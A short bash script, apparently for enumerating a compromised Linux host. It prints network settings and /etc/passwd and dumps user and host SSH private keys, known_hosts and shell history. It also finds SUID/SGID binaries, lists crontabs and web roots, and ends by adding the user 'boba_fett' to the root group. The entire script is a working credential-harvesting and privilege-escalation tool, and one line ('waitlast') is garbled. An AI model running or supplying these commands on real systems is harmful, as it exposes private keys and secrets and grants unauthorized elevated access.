#!/bin/bash

#networking
echo networking
ifconfig
ip a
cat /etc/passwd
cat /etc/network/interfaces
cat /etc/resolv.conf
hostname
netstat
netstat -r
route
arp -e

#interfaces
echo
echo interfaces
cat /etc/network/interfaces

#system
echo
echo system
cat /proc/version
cat /etc/lsb-release      # Debian based
cat /etc/redhat-release   # Redhat based
uname -a


#userinfo
echo
echo userinfo
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
cat ~/.ssh/known_hosts
id
who
waitlast
cat ~/.bash_history

#find suid files
echo
echo find suid files
find . -perm /4000 -ls

#find guid files
echo
echo find guid files 
find . -perm /2000 -ls  

#current user crontabs
echo
echo current user crontab
crontab -l

#webserver
echo
echo webserver
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/

usermod -a -G root boba_fett
